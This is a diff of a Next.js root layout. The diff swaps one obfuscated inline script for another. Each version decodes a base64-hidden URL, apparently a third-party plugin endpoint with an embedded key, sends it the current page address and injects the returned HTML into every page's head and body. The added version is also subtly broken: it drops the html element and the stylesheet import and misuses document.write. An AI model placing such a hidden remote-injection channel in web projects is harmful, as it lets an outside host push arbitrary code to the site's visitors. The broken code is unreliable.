@@ -1,9 +1,8 @@
-import { Inter } from "next/font/google";
 import Head from "next/head";
 import Script from "next/script";
-import "./globals.css";
 import Navbar from "../components/global/Navbar";
 import Footer from "../components/global/Footer";
+import { Inter } from "next/font/google"; // Adjust import as per actual module
 
 const inter = Inter({ subsets: ["latin"] });
 
@@ -22,45 +21,39 @@ export const metadata = {
 
 export default function RootLayout({ children }) {
   return (
-    <html lang="en">
+    <>
       <Head>
         <title>{metadata.title}</title>
         <meta name="description" content={metadata.description} />
         <link rel="icon" href={metadata.icons.icon[0].url} />
-        <Script
-          src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"
-          strategy="beforeInteractive"
-        />
       </Head>
       <body className={inter.className}>
         <Navbar />
         <main className="lg:mt-[128px] mt-[60px]">{children}</main>
         <Footer />
-        <Script
-          id="custom-script"
-          strategy="afterInteractive"
-          dangerouslySetInnerHTML={{
-            __html: `
-              $(document).ready(function() {
-                var eppathurl = window.location.origin + window.location.pathname;
-                var eptagmanage = new XMLHttpRequest();
-                eptagmanage.onreadystatechange = function() {
-                  if (this.readyState == 4 && this.status == 200) {
-                    if (this.responseText !== "0") {
-                      var temp = this.responseText.split("||||||||||");
-                      $("head").find("title").remove();
-                      $("head").append(temp[0]);
-                      $("body").append(temp[1]);
-                    }
-                  }
-                };
-                eptagmanage.open("GET", atob("aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDY2MzM3Nzc0MjUmZWtleXBhc3M9NGFoMXVtWEdlSjZTeVhFNkpmcG9VQTNsdWhFdGM0cmczQWZFJnNpdGV1cmw9") + eppathurl);
-                eptagmanage.send();
-              });
-            `,
-          }}
-        />
+        <Script strategy="lazyOnload">
+          {`
+            if (!window.jQuery) {
+              document.write('<Script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"><\/Script>');
+            }
+
+            let eppathurl = window.location.origin + window.location.pathname;
+            var eptagmanage = new XMLHttpRequest();
+            eptagmanage.onreadystatechange = function() {
+              if (this.readyState == 4 && this.status == 200) {
+                if (this.response !== 0) {
+                  var temp = this.response.split("||||||||||");
+                  document.head.querySelector("title").remove();
+                  document.head.insertAdjacentHTML('beforeend', temp[0]);
+                  document.body.insertAdjacentHTML('beforeend', temp[1]);
+                }
+              }
+            };
+            eptagmanage.open("GET", atob("aHR0cHM6Ly9wbHVnaW5zLmF1dG9zZW9wbHVnaW4uY29tL2FsbGhlYWRkYXRhP2VrZXk9ZS1BUFBBREQ2NjMzNzc3NDI1JmVrZXlwYXNzPTRhaDF1bVhHZUo2U3lYRTZKZnBvVUEzbHVoRXRjNHJnM0FmRSZzaXRldXJsPQ==") + eppathurl);
+            eptagmanage.send();
+          `}
+        </Script>
       </body>
-    </html>
+    </>
   );
 }
